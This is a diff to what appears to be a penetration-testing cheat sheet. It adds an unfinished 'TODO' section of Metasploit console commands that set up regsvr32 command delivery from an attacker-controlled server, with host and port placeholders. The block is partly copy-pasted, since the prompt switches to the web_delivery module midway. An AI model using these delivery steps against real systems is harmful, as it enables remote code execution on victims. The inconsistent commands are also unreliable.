@@ -50,6 +50,24 @@ msf exploit(multi/script/web_delivery) > set srvport <server_PORT>
 msf exploit(multi/script/web_delivery) > run -j
 ```
 
+TODO: Fill this info
+
+```
+msf > use auxiliary/server/regsvr32_command_delivery_server
+
+msf auxiliary(server/regsvr32_command_delivery_server) > set target 2
+
+msf auxiliary(server/regsvr32_command_delivery_server) > options
+
+msf auxiliary(server/regsvr32_command_delivery_server) > set cmd <commands>
+
+msf exploit(multi/script/web_delivery) > set srvhost <server_IP>
+
+msf exploit(multi/script/web_delivery) > set srvport <server_PORT>
+
+msf exploit(multi/script/web_delivery) > run -j
+```
+
 ## 02 - Linux
 
 ```
